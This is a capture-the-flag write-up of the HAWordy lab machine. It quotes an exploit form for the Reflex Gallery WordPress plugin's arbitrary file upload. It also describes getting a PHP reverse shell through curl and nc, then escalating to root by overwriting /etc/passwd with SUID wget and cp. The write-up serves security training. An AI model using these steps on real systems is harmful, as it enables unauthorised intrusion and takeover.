# HAWordy

## Introduction

Welcome to my another writeup! In this Offensive Security's Proving Grounds Play **HAWordy** machine, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> A beginner machine with multiple paths. Only local.txt and proof.txt are valid flags. 

- Author: [Ashray Gupta](https://www.vulnhub.com/entry/ha-wordy,363/)

- Released on: Jul 20, 2020

- Difficulty: Intermediate

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a1.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a2.png)

According to `rustscan` result, we have one port is opened:

Ports Open        | Service
------------------|------------------------
80                | Apache httpd 2.4.29

## HTTP on Port 80

Always brute force hidden directory in a web server via `gobuster`!

**Gobuster Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a3.png)

Found `/wordpress` directory.

***WordPress Enumeration:***

**WPScan Result:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a4.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a8.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a9.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a10.png)

Found **7 plugins, most of them are vulnerable.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a6.png)

Found 2 users: `admin` and `aarti`.

**In the `Reflex Gallery` plugin, it suffers an Arbitrary File Upload vulnerability.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a11.png)

# Initial Foothold

**36374.txt:**
```
# Exploit :

<form method="POST" action="http://127.0.0.1:1337/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=2015&Month=03" enctype="multipart/form-data" >
    <input type="file" name="qqfile"><br>
    <input type="submit" name="Submit" value="Pwn!">
</form>


# Shell Path : http://127.0.0.1:1337/wordpress/wp-content/uploads/2015/03/backdoor.php
```

We can create an `index.html` file which contain the above HTML code, host it and upload a PHP reverse shell. Or, we can simply use `curl` to achieve this:

1. Copy PHP reverse shell from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), and modify the `$ip` and `$port` variable:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a12.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a13.png)

2. Send a POST request to that vulnerable plugin via `curl`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a14.png)

3. Setup a `nc` listener and trigger the PHP reverse shell:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a15.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a16.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a17.png)

And we're `www-data`!

**local.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a18.png)

# Privilege Escalation

## www-data to root

By doing enumeration manually, we can see 2 **SUID** sticky bit stands out:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a19.png)

`/usr/bin/wget` and `/bin/cp` has SUID sticky bit, which is not common and can be abused to escalate our privilege.

1. Transfer the `/etc/passwd` file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a20.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a21.png)

2. Add a new user with root privilege:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a22.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a23.png)

3. Transfer the file and override the original `/etc/passwd` via `cp`: (It's a good hibit to backup the original file.)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a24.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a25.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a26.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a27.png)

4. Switch User to the newly created user:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a28.png)

And I'm root! :D

# Rooted

**proof.txt:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Proving-Grounds-Play/HAWordy/images/a29.png)

# Conclusion

What we've learned:

1. Directory Enumeration
2. WordPress Enumeration (`wpscan`)
3. Exploiting WordPress Plugins
4. Privilege Escalation via SUID Sticky Bit (`wget`, `cp`)